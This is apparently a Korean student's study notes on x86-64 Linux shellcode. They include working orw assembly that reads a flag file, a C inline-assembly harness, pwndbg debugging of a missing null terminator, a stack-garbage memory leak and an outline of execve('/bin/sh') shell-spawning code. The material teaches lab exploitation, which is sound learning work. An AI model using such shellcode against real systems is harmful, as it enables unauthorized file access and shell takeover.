# Exploit Tech: Shellcode

### 익스플로잇(Exploit)

- “부당하게 이용하다” 라는 의미

### shellcode

- **익스플로잇을 위해** 제작된 어셈블리 코드 조각
- 만약 `rip`를 **자신이 작성한 셀 코드로 옮길 수 있으면** 다른 어셈블리 코드가 실행되게 할 수 있음
- 어셈블리어는 **기계어와 거의 일대일 대응**되므로 사실상 원하는 모든 명령을 CPU에 내릴 수 있음

### **orw 셸코드**

- 파일을 열고, 읽은 뒤 화면에 출력해주는 셀 코드

**`/tmp/flag`를 읽는 셀 코드**

```c
char buf[0x30];

int fd = open("/tmp/flag", RD_ONLY, NULL);
read(fd, buf, 0x30); 
write(1, buf, 0x30);
```

### **syscall**

| **syscall** | **rax** | **arg0 (rdi)** | **arg1 (rsi)** | **arg2 (rdx)** |
| --- | --- | --- | --- | --- |
| read | 0x00 | unsigned int fd | char *buf | size_t count |
| write | 0x01 | unsigned int fd | const char *buf | size_t count |
| open | 0x02 | const char *filename | int flags | umode_t mod |

**int fd = open(“/tmp/flag”, O_RDONLY, NULL)**

- 우선 `/tmp/flag` 문자열을 메모리에 위치 시켜야 함
- `0x67616c662f706d742f (/tmp/flag 의 리틀 엔디안 형태)`를 `push`하여 위치시킴
    - `0x67`먼저 `push`하고 `0x616c662f706d742f`를 `push`해야함 (8바이트)

```nasm
push 0x67
mov rax, 0x616c662f706d742f 
push rax
mov rdi, rsp    ; rdi = "/tmp/flag"
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open("/tmp/flag", RD_ONLY, NULL)
```

- `rax` → `0x02` (`sysxall` 중 `open`)
- `rdi` → `/tmp/flag`
- `rsi` → `0`
- `rdx` → `0`
    - `rax` → `syscall`
    - 나머지 인자는 `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`  순

→ `syscall`반환 값은 `rax`에 저장됨!

**2.read(fd, buf, 0x30)**

- `rdi` → `rax`에 저장된 반환 값을 `rdi`에 대입함
- `rsi` → 파일에서 읽은 데이터를 저장할 주소 (`rsp` - `0x30`)
- `rdx` → `0x30`

```nasm
mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
mov rdx, 0x30     ; rdx = 0x30     ; len
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)
```

- `rax` → `0x0` (`sysxall` 중 `read`)
- `rdi` → `rax` 반환 값
- `rsi` → `rsp` - `0x30`
- `rdx` → `0x30`

**3. write(1, buf, 0x30)**

- `stdout`을 통해 출력할 것이므로 `rdi` → `0x1`
- `rsi` 와 `rdx`는 유지

```nasm
mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)
```

### **orw 셸코드 컴파일 및 실행**

- 기계어로 치환하면 CPU가 이해할 수는 있으나 리눅스에서는 실행이 불가능하므로
- gcc 컴파일러를 통해 스켈레톤 코드를 C언어로 작성하고, 셸코드를 탑재하는 방법을 쓸거임

```c
// File name: orw.c
// Compile: gcc -o orw orw.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"

    "push 0x67\n"
    "mov rax, 0x616c662f706d742f \n"
    "push rax\n"
    "mov rdi, rsp    # rdi = '/tmp/flag'\n"
    "xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
    "xor rdx, rdx    # rdx = 0\n"
    "mov rax, 2      # rax = 2 ; syscall_open\n"
    "syscall         # open('/tmp/flag', RD_ONLY, NULL)\n"
    "\n"
    "mov rdi, rax      # rdi = fd\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x30     # rsi = rsp-0x30 ; buf\n"
    "mov rdx, 0x30     # rdx = 0x30     ; len\n"
    "mov rax, 0x0      # rax = 0        ; syscall_read\n"
    "syscall           # read(fd, buf, 0x30)\n"
    "\n"
    "mov rdi, 1        # rdi = 1 ; fd = stdout\n"
    "mov rax, 0x1      # rax = 1 ; syscall_write\n"
    "syscall           # write(fd, buf, 0x30)\n"
    "\n"
    "xor rdi, rdi      # rdi = 0\n"
    "mov rax, 0x3c	   # rax = sys_exit\n"
    "syscall		   # exit(0)");

void run_sh();

int main() { run_sh(); }
```
![image](https://github.com/user-attachments/assets/6d795dc9-6759-49e6-a0b8-f1337ca148da)


**추가**

flag 파일을 `tmp/flag` 위치가 아닌 `home/alex0/pwnable/flag` 위치에 넣어봤다
![image](https://github.com/user-attachments/assets/b54e9ea6-fdcb-486b-9e96-7b23a960faac)


파일 위치를 적어야하니 경로를 변환해주고 넣어준다.  

```c
__asm__(
    ".global run_sh\n"
    "run_sh:\n"

    "mov rax, 0x67616c662f656c62\n" // galf/elb
    "push rax\n"
    "mov rax, 0x616e77702f307865\n" // anwp/0xe
    "push rax\n"
    "mov rax, 0x6c612f656d6f682f\n" // la/emoh/
    "push rax\n"

    "mov rdi, rsp    # rdi = '/tmp/flag'\n"
    "xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
    "xor rdx, rdx    # rdx = 0\n"
    "mov rax, 2      # rax = 2 ; syscall_open\n"
    "syscall         # open('/tmp/flag', RD_ONLY, NULL)\n"
    "\n"
    "mov rdi, rax      # rdi = fd\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x30     # rsi = rsp-0x30 ; buf\n"
    "mov rdx, 0x30     # rdx = 0x30     ; len\n"
    "mov rax, 0x0      # rax = 0        ; syscall_read\n"
    "syscall           # read(fd, buf, 0x30)\n"
    "\n"
    "mov rdi, 1        # rdi = 1 ; fd = stdout\n"
    "mov rax, 0x1      # rax = 1 ; syscall_write\n"
    "syscall           # write(fd, buf, 0x30)\n"
    "\n"
    "xor rdi, rdi      # rdi = 0\n"
    "mov rax, 0x3c	   # rax = sys_exit\n"
    "syscall		   # exit(0)");
```


![image](https://github.com/user-attachments/assets/9c7d18e9-d10f-4382-a9c1-db3f46d30d0a)



근데 위 코드를 써봐도 아무런 반응이 일어나지 않았다.

pwndbg을 이용해서 오류가 있는지 찾아봤다.

 `run_sh`위치까지 가서 스택 상황을 보면


![image](https://github.com/user-attachments/assets/9ab6ec04-d2a7-4fb3-9900-79abfa93a7ec)

경로에는 오류가 없었다

조금 더 뒤로 가서 open syscall이 잘 실행되었는지 보면 

 file: 0x7fffffffdf30 ◂— 0x6c612f656d6f682f ('/home/al')로 경로를 이상하게 잡고있다.

![image (6)](https://github.com/user-attachments/assets/e3d9ca57-0910-4d4a-98e3-4c3c0328691a)

찾아보니 `home/alex0/pwnable/flag` 를 

> "mov rax, 0x67616c662f656c62\n" // galf/elb
    "push rax\n"
    "mov rax, 0x616e77702f307865\n" // anwp/0xe
    "push rax\n"
    "mov rax, 0x6c612f656d6f682f\n" // la/emoh/
    "push rax\n"
> 

이렇게 썼는데 정확히 8바이트를 알파벳이나 / 로 8바이트를 채운 세 줄이다

이런 경우에는 문자의 끝을 인식하는 종단 바이트가 없어서 open이 잘못된 경로로 해석한 경우이다

전에 했던 `tmp/flag`같은 경우에는 0으로 채우지 않아도 `0x67` 과 같이 8바이트를 전부 채우지 않는 값을 넣으면 나머지는 0으로 패딩된다고 한다

```c
 		"mov rax, 0x00\n"
    "push rax\n"
    "mov rax, 0x67616c662f656c62\n" // galf/elb
    "push rax\n"
    "mov rax, 0x616e77702f307865\n" // anwp/0xe
    "push rax\n"
    "mov rax, 0x6c612f656d6f682f\n" // la/emoh/
    "push rax\n"
```


따라서 이렇게 문자의 끝을 적어주면
![image](https://github.com/user-attachments/assets/e21c1da8-2db7-4157-a88b-9ef6e10c01a8)

잘 출력이 된다

### **초기화되지 않은 메모리 영역 사용**

버퍼 크기를 `0x100`으로 늘리고 실행을 해보면


![image](https://github.com/user-attachments/assets/2e1a2ffb-f82e-40c8-8526-4d0f4b267921)


이렇게 이상한 값이 나온다  
`read` 명령어로 이동한 다음 해당 구간의 `rsi` 가 가리키는 메모리 주소에 적힌 값을 보면  


![image](https://github.com/user-attachments/assets/09452857-dcd0-4751-933e-97a012e7a6a5)

이러한 값들이 나온다  

이걸 읽을 수 있게 바꿔보면

![image](https://github.com/user-attachments/assets/c9eb4f46-3cdc-4eb2-b9db-9c5d56ea6d0a)

뒤에 알 수 없는 글씨들이 나온다

이러한 경우처럼 스택에 널 값이 아닌 쓰레기 값이 들어있는 경우가 있다.

 쓰레기 값은 의미 없는 값이 아닌 어떤 메모리 주소일 수도 있고, 그런 값을 유출해 내는 작업을 **메모리 릭**이라고 부른다

### **execve 셸코드**

- **execve 셸코드**는 임의의 프로그램을 실행하는 셸코드
- 이를 이용하여 서버의 셸을 획득 가능

### **execve(“/bin/sh”, null, null)**

- `rax` → `0x3b`
- `argv` → 실행 파일에 넘겨줄 인자
- `envp`→  환경 변수
- `sh`만 실행하면 되므로 다른 값들은 전부 `null`로 설정해줘도 됨

| **syscall** | **rax** | **arg0 (rdi)** | **arg1 (rsi)** | **arg2 (rdx)** |
| --- | --- | --- | --- | --- |
| execve | 0x3b | const char *filename | const char *const *argv | const char *const *envp |

```bash
bash$ gcc -o execve execve.c -masm=intel
bash$ ./execve
sh$ id 
```

위 명령어를 치면 sh가 성공적으로 실행된다


### **objdump 를 이용한 shellcode 추출**

![image (7)](https://github.com/user-attachments/assets/249a379a-0d47-438f-b1d1-378026af436c)

아래 명령어들을 통해 성공적으로 바이트 코드 형태의 셀 코드를 얻을 수 있다
























